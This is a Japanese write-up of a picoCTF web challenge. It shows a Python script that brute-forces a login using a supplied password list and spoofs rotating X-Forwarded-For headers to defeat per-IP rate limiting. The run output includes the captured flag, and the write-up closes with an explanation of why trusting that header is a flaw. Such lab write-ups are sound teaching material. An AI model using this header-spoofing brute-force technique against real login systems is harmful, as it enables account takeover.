## 問題文とヒンツ
ログインシステムは基本レート制限機構を実装し、同一ソースからの繰り返し失敗試行をロックアウトするようになりました。ただし、システムがユーザー制御ヘッダーを依然として信頼している可能性があるとの情報を得ています。あなたの目的は、レート制限を回避し、既知のメールアドレス ctf-player@picoctf.org を使用してログインし、隠された秘密を暴くことです。
チャレンジインスタンス起動後に追加詳細が提供されます。


ヒント1：サーバーはあなたの接続元IPをどのように認識していますか？
ヒント2：X-Forwarded-Forの詳細はこちら
ヒント3：偽装IPをローテーションすることでレート制限を回避可能です。


ログインシステムには基本レート制限機能が追加され、同一ソースからの繰り返し失敗試行をブロックします。システムがユーザー制御ヘッダーを依然として信頼している可能性があるとの情報が入っています。あなたの目的は、レート制限を回避し、既知のメールアドレス ctf-player@picoctf.org を使用してログインし、隠された秘密を解き明かすことです。
ウェブサイトはこちらで稼働中です。ログインを試みられますか？
パスワードリストはこちらからダウンロードしてください。

## アプローチ
1. ログイン試行 → 失敗が繰り返されるとロックアウト
既知のメールアドレス ctf-player@picoctf.org を使用してログイン

20個のパスワードリスト

これらを使ってログイン試行しました。

ログイン失敗1回目のダイアログ：Invalid credentials（無効な認証情報）
ログイン失敗2回目のダイアログ：Too many failed attempts. Please try again in 20 minutes.（失敗した試行が多すぎます。20分後に再度お試しください。）

ロックアウトされた

2. ヒントを読む
多くのWebサーバーはX-Forwarded-For: 1.2.3.4というヘッダーを使って
「このリクエストの本当のIPは 1.2.3.4 です」と判断します。
本来これは プロキシやロードバランサ用のヘッダー ですが、
もしアプリがそれをそのまま信用していたら？
👉 自分でIPを自由に書ける
👉 毎回違うIPにすればロックされない

3. Burpで「やる」
スクリプト
```
import requests

url = "http://amiable-citadel.picoctf.net:50813/login"

passwords = [
"JiywhfQn",
"3zSd0XU0",
"50ylF3Uo",
"7XbIBfcQ",
"W4K0inBD",
"pSvOYV4a",
"MpNXnpfS",
"ZuylCpyS",
"bgl0SpNj",
"h2qf8Ppg",
"maSXnInx",
"iiidp7qG",
"enyDlwq8",
"P5gRbs2V",
"YrWWubgE",
"Gq7ZVFuD",
"Xpseyq9h",
"lVY5T9Ah",
"URgET2ph",
"6epBnWRf"
]

for i, pw in enumerate(passwords):
    headers = {
        "X-Forwarded-For": f"1.1.1.{i}"
    }

    data = {
        "email": "ctf-player@picoctf.org",
        "password": pw
    }

    r = requests.post(url, headers=headers, json=data)

    print(f"Trying: {pw} -> {r.text}")

    if "true" in r.text:
        print("\n🔥 SUCCESS:", pw)
        break


```

実行結果
```
okoyamatowa/picoCTF/.venv/bin/activate
(.venv) yokoyamatowa@yokoyamadaidaiwanoMacBook-Air picoCTF % /Users/yokoyamatowa/picoCTF/.venv/bin/python /Users/yokoyamatowa/picoCTF/2026/web/medium
/CraacktheGate2/attack.py
Trying: JiywhfQn -> {"success":false}
Trying: 3zSd0XU0 -> {"success":false,"error":"Too many failed attempts. Please try again in 20 minutes."}
Trying: 50ylF3Uo -> {"success":false}
Trying: 7XbIBfcQ -> {"success":false}
Trying: W4K0inBD -> {"success":false}
Trying: pSvOYV4a -> {"success":false}
Trying: MpNXnpfS -> {"success":false}
Trying: ZuylCpyS -> {"success":false}
Trying: bgl0SpNj -> {"success":false}
Trying: h2qf8Ppg -> {"success":false}
Trying: maSXnInx -> {"success":false}
Trying: iiidp7qG -> {"success":false}
Trying: enyDlwq8 -> {"success":false}
Trying: P5gRbs2V -> {"success":false}
Trying: YrWWubgE -> {"success":false}
Trying: Gq7ZVFuD -> {"success":false}
Trying: Xpseyq9h -> {"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{xff_byp4ss_brut3_ff36dbbc}"}

🔥 SUCCESS: Xpseyq9h
```
---
## 解説
① サーバーはレート制限をしている
本物IP（TCP層）で管理するべき
仕様：
同じIPから何回もログイン失敗 → 20分ロック
つまり内部では多分こうなっている：
```
failed_attempts[ip] += 1

if (failed_attempts[ip] > 1) {
    lockout()
}
→サーバーがHTTPヘッダーのXFFを信頼
```
② サーバーは「IP」をどう取得している？
普通は：
req.ipやreq.connection.remoteAddress使う。
③ でもこのサーバーは…ヒントにあった：X-Forwarded-Forを使っている可能性がある。
つまり内部でconst ip = req.headers["x-forwarded-for"];みたいなことをしている。
🚨 ここが致命的ミスX-Forwarded-For はユーザーが自由に書けるヘッダーつまり：
X-Forwarded-For: 1.1.1.1も
X-Forwarded-For: 999.999.999.999も自由。
🎯 何が起きたか
最初：
IP = あなたの本当のIP
失敗1回 → OK
失敗2回 → ロック
でもスクリプトでは：
1回目 → IP=1.1.1.0
2回目 → IP=1.1.1.1
3回目 → IP=1.1.1.2
4回目 → IP=1.1.1.3
サーバーから見ると：
毎回違う人が失敗している
だからロックされない。
🧨 つまり何をした？
レート制限の前提を壊した
サーバーの前提：IPは信頼できる
あなたがやったこと：IPは偽装できる